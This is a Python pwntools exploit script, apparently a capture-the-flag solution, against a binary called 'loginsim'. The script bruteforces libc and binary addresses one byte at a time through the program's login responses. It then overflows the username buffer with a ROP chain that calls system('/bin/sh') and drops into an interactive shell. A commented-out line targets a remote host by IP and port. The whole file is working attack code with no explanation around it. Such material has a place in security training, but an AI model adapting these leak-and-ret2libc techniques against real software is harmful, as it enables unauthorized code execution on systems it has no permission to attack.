#!/usr/bin/python3
from pwn import *
from time import sleep

exe = ELF("loginsim_patched", checksec=False)
libc = ELF("./glibc/libc.so.6", checksec=False)
ld = ELF("./glibc/ld.so", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "WARNING"
isDebug = False

# brva 0x00001395 - _login
# brva 0x0000142f - _register
# brva 0x00001507 - main
# brva 0x00001404 - _login.strncmp

# brva 0x00001493
# brva 0x00001474
# brva 0x0000136f

gs = '''
brva 0x0000136c
brva 0x00001360
disable 2
condition 2 $rax = 0x80
disable 1
enable 2
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset
		
def register(username, nameLength):
	io.recvuntil(b"->")
	io.sendline(b"1")
	io.recvuntil(b"Username length: ")
	io.sendline(str(nameLength).encode())
	io.recvuntil(b"Enter username: ")
	io.sendline(username)

def login(username):
	io.recvuntil(b"->")
	io.sendline(b"2")
	io.recvuntil(b"Username:")
	io.sendline(username)

	response = io.recvlineS()
	if (brute_negative == response.strip()):
		return False
	elif (brute_positive == response.strip()):
		return True

def exit_program():
	io.sendline(b"3")

def do_leak(padding_to_address, num_of_bytes_to_leak) -> int:
	foundbytes = []
	padding = padding_to_address
	for j in range(num_of_bytes_to_leak):
		for i in range(0x100):
			username = b"w" * padding + b"f" * j + bytes([i])
			nameLength = len(username)
			register(username, nameLength)
			
			username = b"w" * padding + b"f" * j
			if login(username) == True:
				foundbytes.append(hex(i))
				break

	foundbytes.reverse()
	concatenated = ''.join(value[2:] for value in foundbytes)
	leaked_address = int(concatenated, 16)
	return leaked_address

def brute_libc():
	print("Bruteforcing libc... please standby.")
	leaked_address = do_leak(32, 6)
	libc.address = leaked_address - libc__IO_2_1_stdout__offset

def brute_binary():
	print("Bruteforcing binary... please standby.")
	leaked_address = do_leak(40, 6)
	exe.address = leaked_address - bin_menu_exit_offset

def overflow():
	print("Overflowing for the win...")
	foundbytes = []
	nameLength = 0x80
	username = flat(
		b"w" * nameLength,
		b" " * 56,
		p64(libc_pop_rdi_ret),
		p64(libc_bin_sh),
		p64(libc_ret),
		p64(libc.sym['system']),
		p64(exe.sym['main'])
	)

	register(username, nameLength)

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56
io = start_local(isDebug)
# io = remote("167.99.85.216", 31357)

bin_menu_exit_offset = 0x000025fe

libc__IO_2_1_stdout__offset = 0x00000000001ec6a0
libc__IO_file_overflow_offset = 0x6f013

brute_negative = "Invalid username! :)"
brute_positive = "Good job! :^)"

brute_libc()
brute_binary()

libc_pop_rdi_ret = libc.address + 0x0000000000026b72
libc_bin_sh = libc.address + 0x001b75aa
libc_ret = libc.address + 0x00000000000c0533

print(f"{hex(exe.address)=}")
print(f"{hex(libc.address)=}")
print(f"{hex(libc_pop_rdi_ret)=}")
print(f"{hex(libc_bin_sh)=}")
print(f"{hex(libc_ret)=}")
print(f"{hex(libc.sym['system'])=}")

overflow()

io.interactive()

